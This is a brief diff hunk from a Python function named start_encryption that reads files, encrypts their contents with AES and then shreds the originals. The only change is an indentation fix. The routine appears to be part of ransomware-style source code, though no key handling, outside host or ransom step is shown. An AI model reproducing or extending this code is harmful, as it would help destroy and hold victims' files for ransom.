@@ -62,7 +62,7 @@ def start_encryption(files):
                     AES_obj = symmetric.AESCipher(key)
 
                     found_file = base64.b64decode(found_file)
-                        file_content = f.read()
+                    file_content = f.read()
 
                     encrypted = AES_obj.encrypt(file_content)
                     utils.shred(found_file)
